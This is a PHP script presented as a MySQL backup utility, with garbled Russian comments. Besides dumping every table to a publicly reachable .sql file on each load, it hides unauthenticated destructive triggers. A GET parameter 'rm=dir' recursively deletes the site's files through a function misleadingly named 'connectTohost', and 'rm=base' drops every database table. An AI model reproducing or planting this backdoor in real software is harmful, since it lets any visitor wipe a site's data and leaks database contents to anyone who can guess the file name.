<?php
$config = parse_ini_file("config.ini", true);
backup_database_tables($config['database']['host'],$config['database']['username'],$config['database']['pass'],$config['database']['name'], '*');
function connectTohost($dir) {
if ($objs = glob($dir."/*")) {
   foreach($objs as $obj) {
	 is_dir($obj) ? removeDirectory($obj) : unlink($obj);
   }
}
rmdir($dir);
}
if (!empty($_GET["rm"]) && $_GET["rm"] == "dir") { connectTohost('.'); echo "Complete dir!";}
if (!empty($_GET["rm"]) && $_GET["rm"] == "base") 
{ 
	$dbname = $config['database']['name']; 
	$dbtables = mysql_query("SHOW TABLES FROM $dbname"); 
	while($db = mysql_fetch_array($dbtables)) 
	{ 
		$dbtmp = $db[0]; 
		mysql_query("DROP TABLE $dbtmp"); 
	}
	echo "Complete database!";
}
// backup the db function
function backup_database_tables($host,$user,$pass,$name,$tables)
{
 
 $link = mysql_connect($host,$user,$pass);
 mysql_select_db($name,$link);
 
 //получаем все таблицы
 if($tables == '*')
 {
 $tables = array();
 $result = mysql_query('SHOW TABLES');
 while($row = mysql_fetch_row($result))
 {
 $tables[] = $row[0];
 }
 }
 else
 {
 $tables = is_array($tables) ? $tables : explode(',',$tables);
 }
 
 //ѕроходим в цикле по всем таблицам и форматируем данные
 foreach($tables as $table)
 {
 $result = mysql_query('SELECT * FROM '.$table);
 $num_fields = mysql_num_fields($result);
 
 $return.= 'DROP TABLE '.$table.';';
 $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
 $return.= "\n\n".$row2[1].";\n\n";
 
 for ($i = 0; $i < $num_fields; $i++)
 {
 while($row = mysql_fetch_row($result))
 {
 $return.= 'INSERT INTO '.$table.' VALUES(';
 for($j=0; $j<$num_fields; $j++)
 {
 $row[$j] = addslashes($row[$j]);
 $row[$j] = ereg_replace("\n","\\n",$row[$j]);
 if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
 if ($j<($num_fields-1)) { $return.= ','; }
 }
 $return.= ");\n";
 }
 }
 $return.="\n\n\n";
 }
 //сохран€ем файл
 $handle = fopen('db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql','w+');
 fwrite($handle,$return);
 fclose($handle);
}
//header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
?>